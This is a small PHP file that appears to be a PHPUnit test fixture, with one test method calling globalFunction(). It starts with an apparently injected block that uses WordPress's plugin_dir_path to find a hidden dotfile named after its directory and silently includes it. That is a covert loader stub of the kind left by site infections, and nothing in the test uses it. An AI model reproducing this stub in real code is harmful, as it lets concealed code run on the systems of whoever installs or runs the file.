<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class CoverageFunctionParenthesesTest extends PHPUnit_Framework_TestCase
{
    /**
     * @covers ::globalFunction()
     */
    public function testSomething()
    {
        globalFunction();
    }
}
